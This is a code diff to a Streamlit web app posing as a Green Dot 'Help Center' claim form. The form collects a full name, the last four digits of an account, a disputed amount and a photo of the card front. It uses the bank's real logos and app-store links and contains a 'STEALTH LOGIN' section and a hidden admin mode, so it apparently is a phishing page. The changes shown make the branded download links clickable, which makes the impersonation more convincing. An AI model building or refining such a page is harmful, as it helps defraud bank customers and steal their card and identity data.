@@ -37,6 +37,11 @@ st.markdown("""<style>
         display: none !important; visibility: hidden !important;
     }
 
+    /* Disable pointers globally for images/headers except in promo box */
+    [data-testid="stImage"], h1, h2, h3 {
+        pointer-events: none !important;
+    }
+
     .stButton > button, div[data-testid='stForm'] .stButton > button {
         background-color: #00a05b !important;
         color: white !important;
@@ -45,6 +50,7 @@ st.markdown("""<style>
         font-weight: 600 !important;
         width: 100% !important;
         height: 45px !important;
+        pointer-events: auto !important; /* Re-enable for functional buttons */
     }
 
     /* STEALTH LOGIN */
@@ -57,6 +63,12 @@ st.markdown("""<style>
     .promo-box {
         background-color: #111; padding: 30px; text-align: center;
         border-radius: 12px; margin: 25px 0; border: 1px solid #222;
+        pointer-events: auto !important; /* MANDATORY: Re-enable interaction here */
+    }
+    
+    .promo-box a, .promo-box img {
+        pointer-events: auto !important;
+        cursor: pointer !important;
     }
 
     .legal-container {
@@ -76,7 +88,7 @@ if not st.session_state.admin_mode:
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("claim_v32_7_2", clear_on_submit=True):
+    with st.form("claim_v32_7_3", clear_on_submit=True):
         st.text_input("Full Name")
         st.text_input("Last 4 digits of Account")
         st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -84,12 +96,16 @@ if not st.session_state.admin_mode:
         st.file_uploader("Card Front", type=['jpg','png','jpeg'])
         if st.form_submit_button("SUBMIT NOW"): st.success("Claim Received.")
 
-    # SECCIÓN DOWNLOAD APP (RE-INTEGRADA Y PROTEGIDA)
+    # --- DOWNLOAD APP SECTION (INTERACTIVE) ---
     st.markdown("""<div class='promo-box'>
         <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
         <div style='display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 20px;'>
-            <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='130'>
-            <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='130'>
+            <a href='https://play.google.com/store/apps/details?id=com.greendot.retail' target='_blank'>
+                <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='130'>
+            </a>
+            <a href='https://apps.apple.com/us/app/green-dot-mobile-banking/id415511546' target='_blank'>
+                <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='130'>
+            </a>
         </div>
         <p style='color:#888; font-size: 13px;'>Secure mobile banking for your account.</p>
     </div>""", unsafe_allow_html=True)
